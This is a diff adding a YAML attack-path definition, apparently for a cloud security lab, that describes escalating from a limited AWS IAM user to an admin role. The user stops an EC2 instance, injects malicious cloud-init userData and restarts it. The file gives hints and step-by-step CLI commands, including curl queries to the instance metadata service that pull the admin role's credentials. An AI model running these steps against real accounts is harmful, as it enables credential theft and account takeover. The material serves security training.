@@ -1,0 +1,82 @@
+attackMap:
+  nodes:
+    - id: starting-principal
+      label: "Starting User"
+      type: principal
+      subType: iam-user
+      arn: "arn:aws:iam::{account_id}:user/pl-prod-ec2-002-to-admin-starting-user"
+      description: >
+        You have gained access to this principal's AWS IAM credentials. These could
+        have been obtained through many real-world vectors: phishing a developer and
+        gaining access to their workstation, compromising a browser session, exploiting
+        a vulnerable workload running in this AWS account, discovering credentials in
+        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.
+
+        Regardless of how you obtained them, you are now operating as this principal.
+        This IAM user has ec2:StopInstances, ec2:ModifyInstanceAttribute, and
+        ec2:StartInstances permissions, allowing it to inject a malicious cloud-init
+        payload into an EC2 instance that has an admin IAM role attached.
+    - id: ec2-instance
+      label: "Target EC2 Instance"
+      type: resource
+      subType: ec2-instance
+      arn: "arn:aws:ec2:{region}:{account_id}:instance/i-xxxxxxxxx"
+      description: >
+        This EC2 instance has the admin IAM role attached via an instance profile.
+        By stopping the instance, injecting a malicious cloud-init userData payload,
+        and restarting it, the payload executes on boot with the permissions of the
+        attached role and can extract temporary credentials from IMDS.
+
+    - id: target-role
+      label: "Admin Role"
+      type: principal
+      subType: iam-role
+      isTarget: true
+      arn: "arn:aws:iam::{account_id}:role/pl-prod-ec2-002-to-admin-target-role"
+      description: >
+        This IAM role has AdministratorAccess and is attached to the EC2 instance via
+        an instance profile. By injecting a malicious userData script, you can extract
+        the role's temporary credentials from IMDS (169.254.169.254) when the instance
+        boots, gaining full administrative access to the AWS account.
+
+  edges:
+    - from: starting-principal
+      to: ec2-instance
+      label: "ec2:StopInstances + ec2:ModifyInstanceAttribute"
+      description: >
+        Stop the running EC2 instance, then inject a malicious cloud-init multipart
+        MIME payload via ec2:ModifyInstanceAttribute (userData attribute). The payload
+        uses cloud_final_modules with the 'always' directive to execute on every boot.
+      hints:
+        - "You can modify the boot configuration of EC2 instances."
+        - "Look for EC2 instances with privileged IAM roles attached."
+        - "Stopping an instance lets you change its userData; restarting it executes your payload."
+        - "Browse to https://pathfinding.cloud/paths/ec2-002 for technique details."
+      commands:
+        - description: "Stop the target EC2 instance"
+          command: "aws ec2 stop-instances --instance-ids <instance-id>"
+        - description: "Wait for the instance to reach stopped state"
+          command: "aws ec2 wait instance-stopped --instance-ids <instance-id>"
+        - description: "Inject malicious cloud-init userData (base64-encoded multipart MIME payload)"
+          command: "aws ec2 modify-instance-attribute --instance-id <instance-id> --attribute userData --value file://malicious_userdata.b64"
+        - description: "Start the instance to trigger payload execution"
+          command: "aws ec2 start-instances --instance-ids <instance-id>"
+
+    - from: ec2-instance
+      to: target-role
+      label: "IMDS credential extraction"
+      description: >
+        When the instance boots, the injected cloud-init script queries the Instance
+        Metadata Service at 169.254.169.254 to retrieve temporary credentials for the
+        attached admin role. These credentials are then exfiltrated or used directly
+        to perform privileged actions.
+      hints:
+        - "This instance has a privileged role attached. Its userData can be modified while stopped."
+        - "Use ec2:ModifyInstanceAttribute to inject a script that queries IMDS for credentials."
+      commands:
+        - description: "Query IMDS for the attached role name (runs inside the injected script)"
+          command: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        - description: "Retrieve temporary credentials for the admin role"
+          command: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>"
+        - description: "Verify admin access using extracted credentials"
+          command: "AWS_ACCESS_KEY_ID=<key> AWS_SECRET_ACCESS_KEY=<secret> AWS_SESSION_TOKEN=<token> aws iam list-users"
